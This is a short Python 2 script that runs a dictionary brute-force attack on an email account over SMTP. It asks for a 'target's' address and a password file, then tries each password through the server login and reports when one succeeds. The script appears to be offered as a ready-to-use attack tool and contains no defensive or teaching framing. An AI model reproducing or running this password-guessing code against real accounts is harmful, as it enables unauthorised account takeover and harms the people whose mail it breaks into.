'''
author Stephen Hilliard (c) 2015.
developer Stephen Hilliard (c) 2015.
'''
'''# cat word.list
root@testbin:~/test# pico user.py
# chmod 755 user.py'''

import smtplib

smtpserver = smtplib.SMTP("smtp.user.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter the target's user address")
passwfile = raw_input("Enter the password file name:")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
			smtpserver.login(user, password)

			print "[+] Password Found %s" % password
			break;
	except smtplib.SMTPAuthenticationError:
			print "[!] Password Incorrect: %s" % password